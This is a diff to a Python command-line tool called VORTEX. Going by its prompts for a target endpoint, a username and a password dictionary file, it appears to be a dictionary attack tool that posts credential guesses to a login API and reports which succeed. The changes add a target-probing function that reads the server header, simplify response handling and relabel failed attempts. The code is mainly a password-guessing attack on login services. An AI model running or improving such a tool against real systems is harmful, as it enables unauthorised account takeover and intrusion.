@@ -9,15 +9,25 @@ def print_banner():
     GRN = '\033[92m'
     RST = '\033[0m'
     banner = f"""{RED}
-  _   _  ____  ____  _____  _  _  ____ 
+  _   _   ____  ____  _____  _   _  ____  
  ( )_( )(  _ \(  _ \(  _  )( \( )( ___)
-  ) _ (  )   / )   / )(_)(  )  (  )__) 
+  ) _ (  )   / )   / )(_)(  )   (  )__) 
  (_) (_)(_)\_)(_)\_)(_____)(_)\_)(____)
- VORTEX v1.1 // BY NEUROPRASS
+  VORTEX v1.1 // BY NEUROPRASS
     {GRN}
  [ Focus: Speed & Power ]
     {RST}"""
     print(banner)
+
+def analyze_mechanism(url):
+    print(f"\n[*] Analyzing: {url}")
+    try:
+        response = requests.head(url, timeout=5)
+        print(f"[+] Status Code: {response.status_code}")
+        print(f"[+] Server Header: {response.headers.get('Server', 'Unknown')}")
+        print("[+] Mechanism: Endpoint responsive. Ready for testing.")
+    except Exception as e:
+        print(f"[-] Could not connect to target: {e}")
 
 def build_request(username, password):
     headers = {"Content-Type": "application/json", "Accept": "application/json"}
@@ -27,12 +37,7 @@ def build_request(username, password):
 def send_request(target_api, headers, payload, result):
     try:
         response = requests.post(target_api, headers=headers, data=payload, timeout=5)
-        # Menangani jika response bukan JSON
-        try:
-            data = response.json()
-        except:
-            data = response.text
-        result.put((response.status_code, data))
+        result.put((response.status_code, response.text))
     except Exception as e:
         result.put((None, str(e)))
 
@@ -63,7 +68,7 @@ def execute_test(target_url, username, password_file):
         if res[0] == 200:
             print(f"[+] 200 OK: {res[1]}")
         else:
-            print(f"[-] {res[0]}: {res[1]}")
+            print(f"[-] Status {res[0]}: Login Failed")
 
 def main():
     print_banner()
@@ -76,7 +81,10 @@ def main():
         
         choice = input("\nvortex-auth > ")
         
-        if choice == "2":
+        if choice == "1":
+            url = input("[?] Enter URL to analyze: ")
+            analyze_mechanism(url)
+        elif choice == "2":
             url = input("[?] Target Endpoint: ")
             user = input("[?] Username: ")
             pfile = input("[?] Password Dictionary File: ")
